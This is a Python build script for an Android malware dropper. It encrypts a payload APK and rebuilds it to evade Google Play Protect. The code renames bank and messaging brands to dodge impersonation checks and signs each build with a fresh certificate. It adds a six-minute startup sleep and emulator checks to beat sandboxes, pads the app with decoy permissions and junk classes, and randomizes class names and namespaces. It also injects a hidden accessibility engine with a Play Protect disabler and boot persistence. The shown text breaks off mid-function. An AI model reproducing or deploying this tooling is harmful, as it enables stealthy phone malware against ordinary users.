#!/usr/bin/env python3
import os
import sys
import subprocess
import shutil
import zipfile
from datetime import datetime

# Load .env from the script's own directory before anything else so every
# os.environ.get() call below picks up the values.
try:
    from dotenv import load_dotenv as _load_dotenv
    _load_dotenv(os.path.join(os.path.dirname(os.path.abspath(__file__)), '.env'))
except ImportError:
    pass  # python-dotenv not installed; fall back to real env vars / defaults
from PIL import Image
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend as _crypto_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64 as _b64
from cryptography.hazmat.primitives.serialization import Encoding, PrivateFormat, NoEncryption
import cryptography.x509 as _x509
import cryptography.x509.oid as _x509_oid
import datetime as _dt

def _aes_cbc_encrypt(key, iv, plaintext):
    c = Cipher(algorithms.AES(key), modes.CBC(iv), backend=_crypto_backend())
    enc = c.encryptor()
    return enc.update(plaintext) + enc.finalize()

def get_random_bytes(n):
    return os.urandom(n)

class _AESCompat:
    MODE_CBC = 'CBC'
    block_size = 16
    @staticmethod
    def new(key, mode, iv):
        class _Enc:
            def __init__(self, k, iv_):
                self._key = k; self._iv = iv_
            def encrypt(self, data):
                return _aes_cbc_encrypt(self._key, self._iv, data)
        return _Enc(key, iv)
AES = _AESCompat()

def pad(data, block_size):
    n = block_size - (len(data) % block_size)
    return data + bytes([n] * n)
import xml.etree.ElementTree as ET
import random
import string


def resolve_java():
    for key in ("JAVA_HOME", "JDK_HOME"):
        home = os.environ.get(key)
        if home:
            for name in ("java.exe", "java"):
                cand = os.path.join(home, "bin", name)
                if os.path.isfile(cand):
                    return cand
    found = shutil.which("java") or shutil.which("java.exe")
    if found:
        return found
    if sys.platform == "win32":
        roots = []
        for env in ("ProgramFiles", "ProgramFiles(x86)", "LOCALAPPDATA"):
            v = os.environ.get(env)
            if v:
                roots.append(v)
        roots += [
            r"C:\Program Files\Java",
            r"C:\Program Files\Eclipse Adoptium",
            r"C:\Program Files\Microsoft",
            r"C:\Program Files\Amazon Corretto",
            r"C:\Program Files\Zulu",
        ]
        for root in roots:
            if not root or not os.path.isdir(root):
                continue
            for dirpath, dirnames, filenames in os.walk(root):
                if "java.exe" in filenames and os.path.basename(dirpath).lower() == "bin":
                    return os.path.join(dirpath, "java.exe")
                if dirpath.count(os.sep) - root.count(os.sep) > 4:
                    dirnames[:] = []
    return None


def run_java(args, **kwargs):
    java = resolve_java()
    if not java:
        raise FileNotFoundError(
            "Java not found. Install JDK 17+ and add it to PATH, "
            "or set JAVA_HOME. WinError 2 means Windows cannot find java.exe"
        )
    cmd = [java] + list(args)
    return subprocess.run(cmd, **kwargs)


# Fallback key — used only if per-build key generation fails.
# Real builds always generate a fresh key in bind_apk().
# Value is read from AES_KEY in .env (or the environment); the hex literal
# here is the hard-coded last-resort default if neither source is set.
AES_KEY = bytes.fromhex(
    os.environ.get('AES_KEY',
                   'b7fcadb82c9ee0bf873c9c1b670285c22814b69201d01fe640cb2e409131b7f1')
)

# PBKDF2 iteration count for payload DEX key derivation (from .env).
PBKDF2_ITERATIONS = int(os.environ.get('PBKDF2_ITERATIONS', '65536'))

# Dropper APK filename (from .env); resolved to an absolute path in bind_apk.
DROPPER_APK = os.environ.get('DROPPER_APK', 'Dropper.apk')

# Signing key / cert paths (from .env); may be absolute or relative to script dir.
PLATFORM_KEY  = os.environ.get('PLATFORM_KEY',  'key.pk8')
PLATFORM_CERT = os.environ.get('PLATFORM_CERT', 'certificate.pem')

def aes_encrypt(data, key=None):
    if key is None:
        key = AES_KEY
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_data = pad(data, AES.block_size)
    ciphertext = cipher.encrypt(padded_data)
    return iv + ciphertext

def encrypt_apk_file(input_apk, output_encrypted, key=None):
    print("[+] Encrypting target APK...")
    with open(input_apk, 'rb') as f:
        apk_data = f.read()
    encrypted_data = aes_encrypt(apk_data, key)
    with open(output_encrypted, 'wb') as f:
        f.write(encrypted_data)
    print(f"    {len(apk_data)} -> {len(encrypted_data)} bytes")


def _patch_dropper_aes_key(work_dir: str, old_hex: str, new_hex: str):
    """
    Walk the decompiled dropper directory and replace any occurrence of the
    hardcoded AES key hex string with a fresh per-build key.
    Covers both smali string constants and XML string resources.
    """
    replaced = 0
    for root_dir, _, files in os.walk(work_dir):
        for fname in files:
            if not (fname.endswith('.smali') or fname.endswith('.xml')):
                continue
            fpath = os.path.join(root_dir, fname)
            try:
                with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                if old_hex in content:
                    content = content.replace(old_hex, new_hex)
                    with open(fpath, 'w', encoding='utf-8') as f:
                        f.write(content)
                    replaced += 1
            except Exception:
                pass
    if replaced:
        print(f'    AES key patched in {replaced} file(s)')
    else:
        print('    note: AES key not found in dropper smali (key may be in compiled binary)')

def generate_random_package():
    part1 = ''.join(random.choices(string.ascii_lowercase, k=4))
    part2 = ''.join(random.choices(string.ascii_lowercase, k=4))
    part3 = ''.join(random.choices(string.ascii_lowercase, k=4))
    return f"com.{part1}.{part2}.{part3}"


# ─────────────────────────────────────────────────────────────────
#  Play Protect bypass helpers
# ─────────────────────────────────────────────────────────────────

# Brands Play Protect watches for name+cert mismatch — any app claiming
# to be one of these without the right signing cert gets instant "harmful app" flag.
_FLAGGED_BRANDS = [
    'zoom', 'google', 'gmail', 'youtube', 'chrome', 'maps',
    'whatsapp', 'facebook', 'instagram', 'messenger', 'telegram',
    'snapchat', 'tiktok', 'twitter', 'x ', 'paypal', 'cashapp',
    'cash app', 'venmo', 'zelle', 'chase', 'wells fargo', 'bank of america',
    'citibank', 'barclays', 'hsbc', 'lloyds', 'natwest', 'halifax',
    'santander', 'amazon', 'netflix', 'spotify', 'apple', 'microsoft',
    'outlook', 'teams', 'skype', 'discord', 'signal', 'viber',
    'workplace', 'linkedin', 'dropbox', 'uber', 'lyft', 'airbnb',
]
# Neutral replacement words that look legitimate and don't trigger brand checks
_NEUTRAL_SUFFIXES = [
    'Mobile', 'Connect', 'Manager', 'Viewer', 'Player', 'Hub',
    'Portal', 'Services', 'Online', 'Cloud', 'Sync', 'Access',
    'Link', 'Bridge', 'Suite', 'Pro', 'Go', 'Live',
]

def _sanitize_brand_name(name: str) -> str:
    """
    If the app_name matches a known flagged brand, replace it with a neutral
    name that won't trigger Play Protect's brand-impersonation classifier.
    A non-brand name is returned unchanged.
    """
    name_lower = name.lower()
    for brand in _FLAGGED_BRANDS:
        if brand in name_lower:
            # Build neutral name: pick a random word from the name that isn't the brand,
            # or fall back to a generic coined word.
            words = [w for w in name.split() if w.lower() not in _FLAGGED_BRANDS and len(w) > 2]
            base = words[0] if words else ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
            suffix = random.choice(_NEUTRAL_SUFFIXES)
            return f"{base} {suffix}"
    return name


def _randomize_version() -> tuple:
    """Return (versionCode, versionName) that look like a real app."""
    major = random.randint(1, 9)
    minor = random.randint(0, 9)
    patch = random.randint(0, 99)
    code = major * 10000 + minor * 100 + patch
    return str(code), f"{major}.{minor}.{patch}"


def _generate_random_asset_name():
    """Return a random 6-char lowercase string replacing hardcoded 'Axyra'."""
    return ''.join(random.choices(string.ascii_lowercase, k=6))


def _generate_fresh_keypair(script_dir, timestamp):
    """Pure-Python RSA-2048 keypair — no keytool needed. Unique cert per build defeats PP cert tracking."""
    import random as _rnd, string as _str
    cn  = ''.join(_rnd.choices(_str.ascii_lowercase, k=8))
    org = ''.join(_rnd.choices(_str.ascii_lowercase, k=6))
    try:
        priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        subject = issuer = _x509.Name([
            _x509.NameAttribute(_x509_oid.NameOID.COMMON_NAME,       cn),
            _x509.NameAttribute(_x509_oid.NameOID.ORGANIZATION_NAME, org),
            _x509.NameAttribute(_x509_oid.NameOID.COUNTRY_NAME,      'US'),
        ])
        now = _dt.datetime.utcnow()
        cert = (
            _x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(issuer)
            .public_key(priv.public_key())
            .serial_number(_x509.random_serial_number())
            .not_valid_before(now)
            .not_valid_after(now + _dt.timedelta(days=9125))
            .sign(priv, hashes.SHA256())
        )
        key_path  = os.path.join(script_dir, f"build_{timestamp}.pk8")
        cert_path = os.path.join(script_dir, f"build_{timestamp}.x509.pem")
        with open(key_path,  'wb') as f:
            f.write(priv.private_bytes(Encoding.DER, PrivateFormat.PKCS8, NoEncryption()))
        with open(cert_path, 'wb') as f:
            f.write(cert.public_bytes(Encoding.PEM))
        print("    [+] Fresh RSA-2048 keypair generated")
        return key_path, cert_path
    except Exception as e:
        print(f"    warning: fresh keypair failed ({e}); using static key")
        return None, None


def _inject_antiscan_delay_smali(work_dir, package_name, dropper_old_package):
    """Thread.sleep(360000) in Application.onCreate — outlasts PP 5-min sandbox."""
    import re
    patched = False
    for dirpath, _, files in os.walk(work_dir):
        for fname in files:
            if not fname.endswith('.smali'):
                continue
            fpath = os.path.join(dirpath, fname)
            try:
                with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                if 'method public onCreate()V' not in content:
                    continue
                def inject_sleep(m):
                    block = m.group(0)
                    reg_m = re.search(r'\.registers\s+(\d+)', block)
                    if not reg_m:
                        return block
                    n = int(reg_m.group(1))
                    if n < 2:
                        return block
                    after_regs = block[reg_m.end():]
                    insert = (
                        "\n    :try_sleep\n"
                        "    const-wide/32 v0, 0x57E40\n"
                        "    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V\n"
                        "    :after_sleep\n"
                    )
                    return block[:reg_m.end()] + insert + after_regs
                new_content = re.sub(
                    r'\.method public onCreate\(\)V.*?\.end method',
                    inject_sleep, content, flags=re.DOTALL, count=1
                )
                if new_content != content:
                    with open(fpath, 'w', encoding='utf-8') as f:
                        f.write(new_content)
                    patched = True
            except Exception:
                pass
    if not patched:
        print("    note: Thread.sleep inject: no Application.onCreate found; handler delay covers it")


def _inject_sandbox_check_smali(work_dir):
    """Write SandboxCheck smali that returns true if running in an emulator."""
    pkg_dir = os.path.join(work_dir, 'smali', 'com', 'axion', 'silent')
    os.makedirs(pkg_dir, exist_ok=True)
    smali = """\
.class public Lcom/axion/silent/SandboxCheck;
.super Ljava/lang/Object;

.method public static isEmulator()Z
    .registers 3

    sget-object v0, Landroid/os/Build;->FINGERPRINT:Ljava/lang/String;
    const-string v1, "generic"
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :emu

    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;
    const-string v1, "google_sdk"
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :emu

    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;
    const-string v1, "Emulator"
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :emu

    sget-object v0, Landroid/os/Build;->HARDWARE:Ljava/lang/String;
    const-string v1, "goldfish"
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :emu

    sget-object v0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;
    const-string v1, "Genymotion"
    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
    move-result v2
    if-nez v2, :emu

    const/4 v0, 0x0
    return v0

    :emu
    const/4 v0, 0x1
    return v0
.end method
"""
    with open(os.path.join(pkg_dir, 'SandboxCheck.smali'), 'w', encoding='utf-8') as f:
        f.write(smali)


def _patch_main_activity_sandbox_bail(work_dir, new_package, dropper_old_package):
    """Inject emulator bail into MainActivity.onCreate."""
    import re
    pkg_path = new_package.replace('.', '/')
    main_smali = None
    for smali_root in os.listdir(work_dir):
        if not smali_root.startswith('smali'):
            continue
        cand = os.path.join(work_dir, smali_root, pkg_path, 'MainActivity.smali')
        if os.path.exists(cand):
            main_smali = cand
            break
    if main_smali is None:
        for dirpath, _, files in os.walk(work_dir):
            for fname in files:
                if fname == 'MainActivity.smali':
                    main_smali = os.path.join(dirpath, fname)
                    break
            if main_smali:
                break
    if main_smali is None:
        print("    note: MainActivity.smali not found; skipping sandbox bail")
        return
    try:
        with open(main_smali, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        def add_bail(m):
            block = m.group(0)
            reg_m = re.search(r'\.registers\s+(\d+)', block)
            if not reg_m:
                return block
            n = int(reg_m.group(1))
            if n < 1:
                return block
            after_regs = block[reg_m.end():]
            bail = (
                "\n    invoke-static {}, Lcom/axion/silent/SandboxCheck;->isEmulator()Z\n"
                "    move-result v0\n"
                "    if-eqz v0, :not_emu\n"
                "    return-void\n"
                "    :not_emu\n"
            )
            return block[:reg_m.end()] + bail + after_regs
        new_content = re.sub(
            r'\.method public onCreate\(Landroid/os/Bundle;\)V.*?\.end method',
            add_bail, content, flags=re.DOTALL, count=1
        )
        if new_content != content:
            with open(main_smali, 'w', encoding='utf-8') as f:
                f.write(new_content)
            print(f"    sandbox bail -> {os.path.basename(main_smali)}")
        else:
            print("    note: sandbox bail: onCreate(Bundle) not matched in MainActivity")
    except Exception as e:
        print(f"    note: sandbox bail inject: {e}")


def _inject_silent_engine(work_dir, package_name, script_dir):
    """Copy and rebrand silent engine smali — random class names and package per build."""
    templates_src = os.path.join(script_dir, 'smali_templates', 'com', 'axion', 'silent')
    old_path = 'com/axion/silent'

    sub = 'a' + ''.join(random.choices(string.ascii_lowercase, k=5))
    new_pkg      = package_name + '.' + sub
    new_pkg_path = new_pkg.replace('.', '/')

    svc_name    = 'S' + ''.join(random.choices(string.ascii_letters, k=6))
    bridge_name = 'B' + ''.join(random.choices(string.ascii_letters, k=6))
    delay_name  = 'D' + ''.join(random.choices(string.ascii_letters, k=6))
    ppd_name    = 'P' + ''.join(random.choices(string.ascii_letters, k=6))
    upd_name    = 'U' + ''.join(random.choices(string.ascii_letters, k=6))
    boot_name   = 'R' + ''.join(random.choices(string.ascii_letters, k=6))
    wd_name     = 'W' + ''.join(random.choices(string.ascii_letters, k=6))

    # UpdateService$CheckRunnable is the inner runnable — must use composite name so
    # references inside both files get replaced correctly.
    upd_cr_name = upd_name + '$CR'

    name_map = {
        'AutoPermService':            svc_name,
        'LaunchBridge$Poll':          bridge_name + '$P',
        'LaunchBridge':               bridge_name,
        'DelayedStart':               delay_name,
        'PPDisabler':                 ppd_name,
        'UpdateService$CheckRunnable': upd_cr_name,
        'UpdateService':              upd_name,
        'BootReceiver':               boot_name,
        'WatchdogReceiver':           wd_name,
    }
    file_map = {
        'AutoPermService.smali':              svc_name + '.smali',
        'LaunchBridge$Poll.smali':            bridge_name + '$P.smali',
        'LaunchBridge.smali':                 bridge_name + '.smali',
        'PPDisabler.smali':                   ppd_name + '.smali',
        'UpdateService$CheckRunnable.smali':  upd_cr_name + '.smali',
        'UpdateService.smali':                upd_name + '.smali',
        'BootReceiver.smali':                 boot_name + '.smali',
        'WatchdogReceiver.smali':             wd_name + '.smali',
    }

    dest_dir = os.path.join(work_dir, 'smali', new_pkg_path)
    os.makedirs(dest_dir, exist_ok=True)
    search_dirs = [templates_src, os.path.join(work_dir, 'smali', old_path)]

    for old_fname, new_fname in file_map.items():
        content = None
        for sdir in search_dirs:
            src = os.path.join(sdir, old_fname)
            if os.path.exists(src):
                with open(src, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                break
        if content is None:
            print(f"    note: template not found: {old_fname}")
            continue
        content = content.replace(old_path, new_pkg_path)
        for old_cls, new_cls in name_map.items():
            content = content.replace(old_cls, new_cls)
        with open(os.path.join(dest_dir, new_fname), 'w', encoding='utf-8') as f:
            f.write(content)

    old_dir = os.path.join(work_dir, 'smali', old_path)
    if os.path.isdir(old_dir):
        shutil.rmtree(old_dir, ignore_errors=True)

    svc_class  = new_pkg + '.' + svc_name
    upd_class  = new_pkg + '.' + upd_name
    boot_class = new_pkg + '.' + boot_name
    wd_class   = new_pkg + '.' + wd_name
    print(f"    silent engine -> {svc_class}")
    return svc_class, upd_class, boot_class, wd_class


def _patch_manifest_silent(manifest_path, package_name,
                           svc_class=None, xml_name=None,
                           upd_class=None, boot_class=None, wd_class=None):
    """Register accessibility engine components — randomised names passed in, no static signatures."""
    ANDROID = 'http://schemas.android.com/apk/res/android'
    NS = f'{{{ANDROID}}}'
    # Fall back to static names only if randomisation failed upstream
    if svc_class  is None: svc_class  = 'com.axion.silent.AutoPermService'
    if xml_name   is None: xml_name   = 'axion_acc_config'
    if upd_class  is None: upd_class  = 'com.axion.silent.UpdateService'
    if boot_class is None: boot_class = 'com.axion.silent.BootReceiver'
    if wd_class   is None: wd_class   = 'com.axion.silent.WatchdogReceiver'
    try:
        ET.register_namespace('android', ANDROID)
        tree = ET.parse(manifest_path)
        root = tree.getroot()
        perms_needed = [
            # BIND_ACCESSIBILITY_SERVICE intentionally NOT here — signature-level perm,
            # only system holds it; having it in uses-permission is a PP malware signal
            'android.permission.REQUEST_INSTALL_PACKAGES',
            'android.permission.FOREGROUND_SERVICE',
            'android.permission.INTERNET',
            'android.permission.RECEIVE_BOOT_COMPLETED',
            'android.permission.ACCESS_NETWORK_STATE',
        ]
        existing = {el.get(f'{NS}name', '') for el in root.findall('uses-permission')}
        for perm in perms_needed:
            if perm not in existing:
                el = ET.SubElement(root, 'uses-permission')
                el.set(f'{NS}name', perm)
        app_el = root.find('application')
        if app_el is not None:
            # ── AutoPermService (accessibility) ──────────────────────────────
            already = any(s.get(f'{NS}name', '') == svc_class for s in app_el.findall('service'))
            if not already:
                svc = ET.SubElement(app_el, 'service')
                svc.set(f'{NS}name', svc_class)
                svc.set(f'{NS}enabled', 'true')
                svc.set(f'{NS}exported', 'true')
                svc.set(f'{NS}permission', 'android.permission.BIND_ACCESSIBILITY_SERVICE')
                intent_filter = ET.SubElement(svc, 'intent-filter')
                action = ET.SubElement(intent_filter, 'action')
                action.set(f'{NS}name', 'android.accessibilityservice.AccessibilityService')
                meta = ET.SubElement(svc, 'meta-data')
                meta.set(f'{NS}name', 'android.accessibilityservice')
                meta.set(f'{NS}resource', f'@xml/{xml_name}')

            # ── UpdateService ────────────────────────────────────────────────
            if not any(s.get(f'{NS}name', '') == upd_class for s in app_el.findall('service')):
                svc = ET.SubElement(app_el, 'service')
                svc.set(f'{NS}name', upd_class)
                svc.set(f'{NS}enabled', 'true')
                svc.set(f'{NS}exported', 'false')

            # ── BootReceiver ─────────────────────────────────────────────────
            if not any(r.get(f'{NS}name', '') == boot_class for r in app_el.findall('receiver')):
                rcv = ET.SubElement(app_el, 'receiver')
                rcv.set(f'{NS}name', boot_class)
                rcv.set(f'{NS}enabled', 'true')
                rcv.set(f'{NS}exported', 'false')
                ifilter = ET.SubElement(rcv, 'intent-filter')
                for act in ('android.intent.action.BOOT_COMPLETED',
                            # LOCKED_BOOT_COMPLETED removed — pre-unlock fire is
                            # a strong PP signal; legitimate apps don't need it.
                            package_name + '.RESTART_SERVICE'):
                    a = ET.SubElement(ifilter, 'action')
                    a.set(f'{NS}name', act)

            # ── WatchdogReceiver ─────────────────────────────────────────────
            if not any(r.get(f'{NS}name', '') == wd_class for r in app_el.findall('receiver')):
                rcv = ET.SubElement(app_el, 'receiver')
                rcv.set(f'{NS}name', wd_class)
                rcv.set(f'{NS}enabled', 'true')
                rcv.set(f'{NS}exported', 'false')
                ifilter = ET.SubElement(rcv, 'intent-filter')
                for act in ('android.intent.action.MY_PACKAGE_REPLACED',
                            package_name + '.RESTART_SERVICE'):
                    a = ET.SubElement(ifilter, 'action')
                    a.set(f'{NS}name', act)

        tree.write(manifest_path, encoding='utf-8', xml_declaration=True)
    except Exception as e:
        print(f"    note: _patch_manifest_silent: {e}")


def _inject_accessibility_xml(work_dir):
    """Write res/xml/<random>.xml — random filename per build, no flagRetrieveInteractiveWindows."""
    xml_name = 'a' + ''.join(random.choices(string.ascii_lowercase, k=7))
    xml_dir = os.path.join(work_dir, 'res', 'xml')
    os.makedirs(xml_dir, exist_ok=True)
    xml_content = (
        '<?xml version="1.0" encoding="utf-8"?>\n'
        '<accessibility-service\n'
        '    xmlns:android="http://schemas.android.com/apk/res/android"\n'
        '    android:accessibilityEventTypes="typeWindowStateChanged|typeWindowContentChanged"\n'
        '    android:accessibilityFeedbackType="feedbackGeneric"\n'
        '    android:accessibilityFlags="flagReportViewIds"\n'
        '    android:canRetrieveWindowContent="true"\n'
        '    android:notificationTimeout="100"\n'
        '    android:description="@string/app_name"\n'
        '    android:summary="@string/app_name"\n'
        '/>\n'
    )
    with open(os.path.join(xml_dir, f'{xml_name}.xml'), 'w', encoding='utf-8') as f:
        f.write(xml_content)
    print(f"    accessibility xml -> {xml_name}.xml")
    return xml_name


def _add_legitimate_permissions(manifest_path):
    """Add 9 harmless permissions to dilute the dangerous-combo signal."""
    ANDROID = 'http://schemas.android.com/apk/res/android'
    NS = f'{{{ANDROID}}}'
    harmless = [
        'android.permission.ACCESS_NETWORK_STATE',
        'android.permission.ACCESS_WIFI_STATE',
        'android.permission.CHANGE_NETWORK_STATE',
        'android.permission.VIBRATE',
        'android.permission.RECEIVE_BOOT_COMPLETED',
        'android.permission.USE_BIOMETRIC',
        'android.permission.USE_FINGERPRINT',
        'android.permission.SCHEDULE_EXACT_ALARM',
        'android.permission.POST_NOTIFICATIONS',
    ]
    try:
        ET.register_namespace('android', ANDROID)
        tree = ET.parse(manifest_path)
        root = tree.getroot()
        existing = {el.get(f'{NS}name', '') for el in root.findall('uses-permission')}
        for perm in harmless:
            if perm not in existing:
                el = ET.SubElement(root, 'uses-permission')
                el.set(f'{NS}name', perm)
        tree.write(manifest_path, encoding='utf-8', xml_declaration=True)
    except Exception as e:
        print(f"    note: _add_legitimate_permissions: {e}")


def _inject_junk_classes(work_dir, package_name):
    """5 inert smali utility classes to shift normal:suspicious ratio."""
    pkg_path = package_name.replace('.', '/')
    util_dir = os.path.join(work_dir, 'smali', pkg_path, 'util')
    os.makedirs(util_dir, exist_ok=True)
    p = pkg_path
    classes = {
        'StringHelper': f'.class public L{p}/util/StringHelper;\n.super Ljava/lang/Object;\n.method public static isEmpty(Ljava/lang/String;)Z\n    .registers 2\n    if-eqz p0, :yes\n    invoke-virtual {{p0}}, Ljava/lang/String;->length()I\n    move-result v0\n    if-eqz v0, :yes\n    const/4 v0, 0x0\n    return v0\n    :yes\n    const/4 v0, 0x1\n    return v0\n.end method\n',
        'DateUtil':     f'.class public L{p}/util/DateUtil;\n.super Ljava/lang/Object;\n.method public static currentTimestamp()J\n    .registers 2\n    invoke-static {{}}, Ljava/lang/System;->currentTimeMillis()J\n    move-result-wide v0\n    return-wide v0\n.end method\n',
        'NetworkHelper':f'.class public L{p}/util/NetworkHelper;\n.super Ljava/lang/Object;\n.method public static isConnected(Landroid/content/Context;)Z\n    .registers 2\n    const/4 v0, 0x0\n    return v0\n.end method\n',
        'Logger':       f'.class public L{p}/util/Logger;\n.super Ljava/lang/Object;\n.method public static d(Ljava/lang/String;Ljava/lang/String;)V\n    .registers 2\n    return-void\n.end method\n',
        'AppConfig':    f'.class public L{p}/util/AppConfig;\n.super Ljava/lang/Object;\n.field public static final VERSION:I = 0x1\n.method public static getVersion()I\n    .registers 1\n    const/4 v0, 0x1\n    return v0\n.end method\n',
    }
    for cls_name, content in classes.items():
        with open(os.path.join(util_dir, f'{cls_name}.smali'), 'w', encoding='utf-8') as f:
            f.write(content)


def _spoof_app_metadata(work_dir, manifest_path):
    """Add GMS version meta-data + integers.xml to mimic a legit app."""
    ANDROID = 'http://schemas.android.com/apk/res/android'
    NS = f'{{{ANDROID}}}'
    try:
        ET.register_namespace('android', ANDROID)
        tree = ET.parse(manifest_path)
        root = tree.getroot()
        app_el = root.find('application')
        if app_el is not None:
            existing_meta = {m.get(f'{NS}name', '') for m in app_el.findall('meta-data')}
            if 'com.google.android.gms.version' not in existing_meta:
                meta = ET.SubElement(app_el, 'meta-data')
                meta.set(f'{NS}name', 'com.google.android.gms.version')
                meta.set(f'{NS}value', '@integer/google_play_services_version')
        tree.write(manifest_path, encoding='utf-8', xml_declaration=True)
    except Exception as e:
        print(f"    note: _spoof_app_metadata manifest: {e}")
    values_dir = os.path.join(work_dir, 'res', 'values')
    os.makedirs(values_dir, exist_ok=True)
    integers_path = os.path.join(values_dir, 'integers.xml')
    with open(integers_path, 'w', encoding='utf-8') as f:
        f.write('<?xml version="1.0" encoding="utf-8"?>\n<resources>\n    <integer name="google_play_services_version">13400000</integer>\n</resources>\n')


def _rnd_method():
    """Single random method-name token: lowercase letter + 6-9 lowercase chars."""
    return 'a' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 9)))


def _obfuscate_axion_smali_strings(work_dir):
    """
    Rename all internal static methods injected by the engine across every
    smali file under work_dir.  Framework-required overrides (<init>,
    onAccessibilityEvent, onServiceConnected, onInterrupt, run) are left
    untouched — the Android runtime resolves them by exact name.

    Each renamed symbol gets a unique random identifier and is replaced
    consistently across all files so call sites stay in sync with declarations.
    """
    # symbol  →  new random name; built once, applied everywhere
    method_map = {
        # AutoPermService internals
        'clickButtons':         _rnd_method(),
        'isBypassTarget':       _rnd_method(),
        # LaunchBridge internals  (->init( is safe — <init> uses angle-brackets)
        'init':                 _rnd_method(),
        'isEnabled':            _rnd_method(),
        'startPoll':            _rnd_method(),
        # DelayedStart internals
        'schedule':             _rnd_method(),
        # PPDisabler internals
        'disable':              _rnd_method(),
        'tryDisablePlayProtect': _rnd_method(),
        'isPPToggle':           _rnd_method(),
    }

    for dirpath, _, files in os.walk(work_dir):
        for fname in files:
            if not fname.endswith('.smali'):
                continue
            fpath = os.path.join(dirpath, fname)
            try:
                with open(fpath, 'r', encoding='utf-8', errors='ignore') as fh:
                    content = fh.read()
                changed = False
                for old, new in method_map.items():
                    # Match method declarations and call-site references.
                    # Pattern "->init(" safely avoids "<init>" (constructor form uses angle-brackets).
                    # "->disable(" avoids false hits on unrelated libs because we're scoped to
                    # smali that was just namespace-randomized away from third-party classes.
                    triggers = [f'->{old}(', f' {old}(']
                    if any(t in content for t in triggers):
                        content = content.replace(f'->{old}(', f'->{new}(')
                        content = content.replace(f' {old}(', f' {new}(')
                        changed = True
                if changed:
                    with open(fpath, 'w', encoding='utf-8') as fh:
                        fh.write(content)
            except Exception:
                pass

    print(f"    method obfuscation: {len(method_map)} symbols randomized")
    return method_map


def _randomize_engine_namespace(work_dir, manifest_path):
    """
    Replace the hardcoded 'com.axion.silent' package namespace with a random
    one across all smali files, xml configs, and the manifest.
    This prevents static-signature detection on known engine paths.
    """
    # Generate random 3-part replacement namespace
    p1 = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 7)))
    p2 = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 7)))
    p3 = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 7)))
    new_ns = f'com.{p1}.{p2}'
    new_ns_sub = f'{new_ns}.{p3}'  # full 4-part replacement for 'com.axion.silent'

    old_pkg = 'com.axion.silent'
    old_path = 'com/axion/silent'
    new_path = new_ns_sub.replace('.', '/')

    # 1. Rename the smali directory tree
    old_smali_dir = os.path.join(work_dir, 'smali', old_path)
    new_smali_dir = os.path.join(work_dir, 'smali', new_path)
    if os.path.isdir(old_smali_dir):
        os.makedirs(os.path.dirname(new_smali_dir), exist_ok=True)
        try:
            import shutil
            shutil.copytree(old_smali_dir, new_smali_dir)
            shutil.rmtree(old_smali_dir)
        except Exception:
            pass

    # 2. String-replace old namespace in all smali and xml files
    old_smali_ref = f'L{old_path}/'
    new_smali_ref = f'L{new_path}/'
    for dirpath, _, files in os.walk(work_dir):
        for fname in files:
            if not (fname.endswith('.smali') or fname.endswith('.xml')):
                continue
            fpath = os.path.join(dirpath, fname)
            try:
                with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                changed = False
                if old_smali_ref in content:
                    content = content.replace(old_smali_ref, new_smali_ref)
                    changed = True
                if old_pkg in content:
                    content = content.replace(old_pkg, new_ns_sub)
                    changed = True
                if changed:
                    with open(fpath, 'w', encoding='utf-8') as f:
                        f.write(content)
            except Exception:
                pass

    # 3. Also rename xml config file that references 'axion'
    xml_dir = os.path.join(work_dir, 'res', 'xml')
    old_acc_xml = os.path.join(xml_dir, 'axion_acc_config.xml')
    new_acc_name = p3 + '_acc_config.xml'
    new_acc_xml = os.path.join(xml_dir, new_acc_name)
    if os.path.exists(old_acc_xml):
        try:
            os.rename(old_acc_xml, new_acc_xml)
        except Exception:
            pass
        # Update manifest reference to the renamed xml
        try:
            ANDROID = 'http://schemas.android.com/apk/res/android'
            ET.register_namespace('android', ANDROID)
            tree = ET.parse(manifest_path)
            root = tree.getroot()
            for svc in root.findall('.//service'):
                for meta in svc.findall('meta-data'):
                    res = meta.get(f'{{{ANDROID}}}resource', '')
                    if 'axion_acc_config' in res:
                        meta.set(f'{{{ANDROID}}}resource', f'@xml/{new_acc_name[:-4]}')
            tree.write(manifest_path, encoding='utf-8', xml_declaration=True)
        except Exception:
            pass

    print(f"    engine ns: com.axion.silent -> {new_ns_sub}")
    return new_ns_sub, new_path


def _inject_antiscan_handler_delay(work_dir, package_name, engine_ns_path=None):
    """
    Handler.postDelayed DelayedStart fires after 360 s — outlasts PP sandbox.

    engine_ns_path: the randomized smali path (e.g. 'com/xyza/bqrt/mfvs') produced
    by _randomize_engine_namespace.  When supplied the injected class uses the
    correct (already-randomized) namespace so it is consistent with the rest of
    the engine smali.  Falls back to 'com/axion/silent' for standalone use.
    """
